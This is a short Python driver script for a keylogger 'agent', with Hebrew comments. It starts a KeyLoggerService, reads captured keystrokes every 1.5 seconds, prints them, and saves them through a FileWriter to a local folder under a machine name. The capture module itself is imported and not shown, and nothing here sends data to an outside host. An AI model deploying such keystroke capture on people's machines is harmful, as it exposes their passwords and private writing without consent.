import time
from agent.keylogger_service import KeyLoggerService
from agent.writers import FileWriter

log = KeyLoggerService()
writer = FileWriter("./agent_out")   # כל הקבצים יישמרו בתיקייה הזאת

log.start_logging()
print("Agent started. הקלד כמה תווים... (Ctrl+C לעצירה)")

try:
    while True:
        chunk = "".join(log.drain())
        if chunk:
            print(f"[KEYS] {chunk}")
            writer.send_data(chunk, machine_name="machine1")
        time.sleep(1.5)
except KeyboardInterrupt:
    print("\nStopping agent...")
finally:
    log.stop_logging()
    leftover = "".join(log.drain())
    if leftover:
        writer.send_data(leftover, machine_name="machine1")
